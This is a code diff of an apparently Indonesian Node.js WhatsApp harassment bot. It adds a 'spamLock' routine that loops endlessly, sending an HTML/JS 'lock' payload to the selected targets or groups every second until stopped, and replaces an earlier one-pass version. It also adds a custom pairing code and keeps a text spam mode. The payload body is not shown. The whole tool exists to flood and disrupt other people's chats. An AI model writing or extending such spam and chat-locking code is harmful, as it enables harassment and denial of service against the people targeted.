@@ -61,7 +61,7 @@ async function sendJsAlert(jid) {
             html: htmlPayload,
             source: 'sukinymous_system'
         })
-        console.log(`[+] HTML/JS Alert terkirim ke: ${jid}`)
+        console.log(`[+] Alert terkirim ke: ${jid}`)
     } catch (e) {
         console.log(`[X] Gagal kirim ke ${jid}: ${e.message}`)
     }
@@ -71,7 +71,7 @@ process.on('SIGINT', () => {
     if (spamming) {
         spamming = false
         clearTimeout(timer)
-        console.log("\n\x1b[31m[SPAM STOPPED]\x1b[0m")
+        console.log("\n\x1b[31m[LOCK SPAM STOPPED]\x1b[0m")
         setTimeout(mainMenu, 1000)
     } else {
         process.exit(0)
@@ -90,9 +90,8 @@ async function processPairing() {
     while (requesting && !isPaired) {
         clr(); console.log(BANNER); console.log("-- STEP 2")
         try {
-            const code = await sock.requestPairingCode(num)
+            const code = await sock.requestPairingCode(num, config.customPairingCode)
             console.log(`CODE: \x1b[33m${code}\x1b[0m`)
-            console.log("[!] Cepat masukkan kode ke WA sebelum expired.")
             
             const choice = await ask("\n> Ketik 'r' untuk Retry, 'b' untuk Batal: ")
             if (choice.toLowerCase() !== 'r') requesting = false
@@ -114,7 +113,7 @@ async function mainMenu() {
         clr(); console.log(BANNER)
         console.log(`[1] Target: ${tgtName || "None"}`)
         console.log(`[2] Spam Teks`)
-        console.log(`[3] Lock Grup (HTML/JS)`)
+        console.log(`[3] Spam Lock HTML (Ctrl+C to Stop)`)
         console.log(`[4] Exit\n`)
 
         const c = await ask("> ")
@@ -125,7 +124,7 @@ async function mainMenu() {
         } 
         else if (c === "3") {
             if (tgt.length === 0) { console.log("\n[!] Pilih target dulu."); await slp(1500); }
-            else await lockTargetGroup()
+            else await spamLock()
         }
         else if (c === "4") process.exit(0)
     }
@@ -156,6 +155,30 @@ async function selectTarget() {
     } catch (e) { 
         console.log(e.message); await slp(1500) 
     }
+}
+
+async function spamLock() {
+    clr(); console.log(BANNER); console.log(`[TGT] ${tgtName} (${tgt.length})\n`)
+    console.log(`[MODE] HTML LOCK SPAM`)
+    console.log(`[RUNNING - Ctrl+C to STOP]\n`)
+
+    spamming = true
+    let cnt = 0
+
+    const loop = async () => {
+        if (!spamming) return
+        for (let i = 0; i < tgt.length; i++) {
+            if (!spamming) break
+            await sendJsAlert(tgt[i])
+            cnt++
+            console.log(`[${new Date().toLocaleTimeString()}] Lock Sent: ${cnt}`)
+            await slp(1000)
+        }
+        if (spamming) timer = setTimeout(loop, 1000)
+    }
+    loop()
+    
+    while (spamming) await slp(1000)
 }
 
 async function startSpam() {
@@ -194,18 +217,6 @@ async function startSpam() {
     loop()
     
     while (spamming) await slp(1000)
-}
-
-async function lockTargetGroup() {
-    clr(); console.log(BANNER); console.log(`[*] Mengirim HTML/JS Alert ke ${tgt.length} target...\n`)
-    
-    for (let i = 0; i < tgt.length; i++) {
-        await sendJsAlert(tgt[i])
-        await slp(2000)
-    }
-    
-    console.log("\n[!] Selesai. Cek grup target.")
-    await ask("\nTekan Enter untuk kembali.")
 }
 
 async function connect() {
